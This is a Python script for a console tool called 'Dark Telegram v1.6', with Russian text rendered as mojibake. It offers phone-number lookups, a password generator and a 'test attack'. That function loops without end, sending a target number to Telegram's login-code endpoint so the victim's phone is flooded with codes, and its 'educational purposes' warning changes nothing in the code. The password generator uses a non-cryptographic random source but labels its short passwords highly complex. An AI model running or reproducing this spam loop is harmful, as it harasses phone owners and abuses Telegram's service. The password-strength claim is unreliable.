def clear_screen():
    """–û—á–∏—Å—Ç–∫–∞ —ç–∫—Ä–∞–Ω–∞ –∫–æ–Ω—Å–æ–ª–∏"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """–í—ã–≤–æ–¥ –∫—Ä–∞—Å–∏–≤–æ–≥–æ –±–∞–Ω–Ω–µ—Ä–∞"""
    banner = f"""
{Fore.RED}‚ïî‚ï¶‚ïó‚ïî‚ïê‚ïó‚ï¶‚ïê‚ïó‚ïî‚ï¶‚ïó‚ïî‚ïê‚ïó‚ïî‚ï¶‚ïó‚ïî‚ïê‚ïó‚ï¶  ‚ïî‚ï¶‚ïó
{Fore.RED} ‚ïë ‚ïë ‚ïë‚ï†‚ï¶‚ïù ‚ïë ‚ù§Ô∏è‚ïê‚ïê‚ï£ ‚ïë ‚ïë ‚ïë‚ïë   ‚ïë 
{Fore.RED} ‚ï© ‚ïö‚ïê‚ïù‚ï©‚ïö‚ïê ‚ï© ‚ï© ‚ï© ‚ï© ‚ïö‚ïê‚ïù‚ï©‚ïê‚ïù ‚ï© 
{Fore.WHITE}{Back.BLACK}‚Ä¢ Dark Telegram v1.6 ‚Ä¢
{Style.RESET_ALL}"""
    print(banner)

def format_country(data):
    """–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –æ —Å—Ç—Ä–∞–Ω–µ"""
    if not isinstance(data, dict):
        return str(data)
    return f"{data.get('name', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')} ({data.get('english', '–Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö')})"

def format_region(data):
    """–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –æ —Ä–µ–≥–∏–æ–Ω–µ"""
    if not isinstance(data, dict):
        return str(data)
    return f"{data.get('name', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')} ({data.get('okrug', '–Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö')})"

def phone_lookup():
    """–ü–æ–∏—Å–∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞"""
    clear_screen()
    print_banner()
    print(f"\n{Fore.GREEN}[1] {Fore.WHITE}–ü–æ–∏—Å–∫ –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞")
    print(f"{Fore.CYAN}="*40)
    
    phone = input(f"{Fore.YELLOW}–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: ").strip()
    
    if not phone.isdigit():
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞: –Ω–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã.")
        return
    
    url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}"
    
    try:
        headers = {"User-Agent": UserAgent().random}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        if not response.text.strip():
            print(f"{Fore.RED}‚ùå –°–µ—Ä–≤–µ—Ä –≤–µ—Ä–Ω—É–ª –ø—É—Å—Ç–æ–π –æ—Ç–≤–µ—Ç.")
            return
        
        data = response.json()
        
        print(f"\n{Fore.CYAN}üìã –†–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–æ–º–µ—Ä–∞:")
        print(f"{Fore.CYAN}="*40)
        print(f"{Fore.WHITE}üìû –ù–æ–º–µ—Ä: {Fore.YELLOW}{phone}")
        print(f"{Fore.CYAN}-"*40)
        print(f"{Fore.WHITE}üåç –°—Ç—Ä–∞–Ω–∞: {Fore.YELLOW}{format_country(data.get('country', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'))}")
        print(f"{Fore.WHITE}üè¢ –û–ø–µ—Ä–∞—Ç–æ—Ä: {Fore.YELLOW}{data.get('operator', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        print(f"{Fore.WHITE}üìç –†–µ–≥–∏–æ–Ω: {Fore.YELLOW}{format_region(data.get('region', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'))}")
        print(f"{Fore.CYAN}="*40)
        
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞: {e}")

def test_attack():
    """–¢–µ—Å—Ç–æ–≤–∞—è –∞—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä"""
    clear_screen()
    print_banner()
    print(f"\n{Fore.GREEN}[2] {Fore.WHITE}–°–ø–∞–º –∫–æ–¥–∞–º–∏")
    print(f"{Fore.RED}‚ö† –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ: –≠—Ç–æ —Ç–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!")
    print(f"{Fore.CYAN}="*40)
    
    try:
        number = input(f"{Fore.YELLOW}–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: ")
        if not number.isdigit():
            print(f"{Fore.RED}‚ùå –ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã!")
            return
            
        count = 0
        headers = {'User-Agent': UserAgent().random}
        
        input(f"{Fore.YELLOW}–ù–∞–∂–º–∏—Ç–µ ENTER —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å...")
        
        while True:
            try:
                requests.post('https://my.telegram.org/auth/send_password', 
                           headers=headers, 
                           data={'phone': number})
                
                requests.get('https://telegram.org/support?setln=ru', 
                          headers=headers)
                
                count += 1
                print(f"{Fore.GREEN}[+] –ó–∞–ø—Ä–æ—Å #{count} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –Ω–æ–º–µ—Ä {number}")
                
            except Exception as e:
                print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞: {e}")
                break
                
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}‚èπ –ê—Ç–∞–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")

def advanced_phone_lookup():
    """–†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –ø–æ–∏—Å–∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞"""
    clear_screen()
    print_banner()
    print(f"\n{Fore.GREEN}[3] {Fore.WHITE}–†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –ø–æ–∏—Å–∫ –ø–æ –Ω–æ–º–µ—Ä—É")
    print(f"{Fore.CYAN}="*50)
    
    phone = input(f"{Fore.YELLOW}–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–±–µ–∑ '+'): ").strip()
    
    if not phone.isdigit():
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞: –Ω–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã.")
        return
    
    url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}"
    
    try:
        headers = {"User-Agent": UserAgent().random}
        
        print(f"\n{Fore.YELLOW}‚åõ –ó–∞–ø—Ä–∞—à–∏–≤–∞—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é...")
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        if not response.text.strip():
            print(f"{Fore.RED}‚ùå –°–µ—Ä–≤–µ—Ä –≤–µ—Ä–Ω—É–ª –ø—É—Å—Ç–æ–π –æ—Ç–≤–µ—Ç.")
            return
        
        data = response.json()
        
        print(f"\n{Fore.CYAN}üìã –†–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–æ–º–µ—Ä–∞:")
        print(f"{Fore.CYAN}="*50)
        print(f"{Fore.WHITE}üìû –ù–æ–º–µ—Ä: {Fore.YELLOW}{phone}")
        print(f"{Fore.CYAN}-"*50)
        
        # –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        print(f"{Fore.WHITE}üåç –°—Ç—Ä–∞–Ω–∞: {Fore.YELLOW}{data.get('country', {}).get('name', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        print(f"{Fore.WHITE}üèô –†–µ–≥–∏–æ–Ω: {Fore.YELLOW}{data.get('region', {}).get('name', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        print(f"{Fore.WHITE}üè¢ –û–∫—Ä—É–≥: {Fore.YELLOW}{data.get('okrug', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        print(f"{Fore.WHITE}üèò –ì–æ—Ä–æ–¥: {Fore.YELLOW}{data.get('city', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        
        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –æ–ø–µ—Ä–∞—Ç–æ—Ä–µ
        oper_info = data.get('oper', {})
        if isinstance(oper_info, dict):
            print(f"{Fore.WHITE}üì± –û–ø–µ—Ä–∞—Ç–æ—Ä: {Fore.YELLOW}{oper_info.get('name', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        else:
            print(f"{Fore.WHITE}üì± –û–ø–µ—Ä–∞—Ç–æ—Ä: {Fore.YELLOW}{oper_info if oper_info else '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}")
        
        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        print(f"{Fore.WHITE}‚è∞ –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: {Fore.YELLOW}{data.get('timezone', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        print(f"{Fore.WHITE}üá∫üá≥ –ö–æ–¥ —Å—Ç—Ä–∞–Ω—ã: {Fore.YELLOW}{data.get('country', {}).get('id', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        print(f"{Fore.WHITE}üè∑ –ö–æ–¥ —Ä–µ–≥–∏–æ–Ω–∞: {Fore.YELLOW}{data.get('region', {}).get('id', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}")
        
        print(f"{Fore.CYAN}="*50)
        
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞: {e}")

def generate_password():
    """–ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä —Å–ª–æ–∂–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π"""
    clear_screen()
    print_banner()
    print(f"\n{Fore.GREEN}[4] {Fore.WHITE}–ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä –ø–∞—Ä–æ–ª–µ–π")
    print(f"{Fore.CYAN}="*40)
    
    length = random.randint(8, 12)
    characters = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choice(characters) for _ in range(length))
    
    print(f"\n{Fore.YELLOW}üîë –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å:")
    print(f"{Fore.CYAN}="*40)
    print(f"{Fore.WHITE}{Back.BLACK}{Style.BRIGHT}{password}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}="*40)
    print(f"{Fore.WHITE}–î–ª–∏–Ω–∞ –ø–∞—Ä–æ–ª—è: {Fore.YELLOW}{length} —Å–∏–º–≤–æ–ª–æ–≤")
    print(f"{Fore.WHITE}–°–ª–æ–∂–Ω–æ—Å—Ç—å: {Fore.YELLOW}–í—ã—Å–æ–∫–∞—è")
    print(f"{Fore.CYAN}="*40)

